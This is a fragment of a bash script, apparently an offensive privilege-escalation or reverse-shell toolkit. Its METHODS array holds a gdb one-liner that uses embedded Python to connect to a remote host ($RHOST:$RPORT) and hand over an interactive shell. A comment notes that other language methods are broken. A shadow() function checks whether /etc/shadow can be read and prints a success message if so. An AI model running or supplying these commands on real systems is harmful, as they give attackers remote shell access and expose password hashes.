...
# PHP, Perl, Node, JJS, and Python are broken; going to fix
METHODS=(
	...
	"gdb , gdb -nx -ex 'python import sys,socket,os,pty;exit()' &> /dev/null , echo 'c' | gdb -nx -ex 'python import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$RHOST\",$RPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"$SHELL\",\"-i\"]);' -ex quit:"
...
shadow () {
	...
	then
		...
		then
			...
			echo -e "\e[92m[+]\e[0m You can read the shadow file"
		fi
		echo "-----------------------"
	fi
}
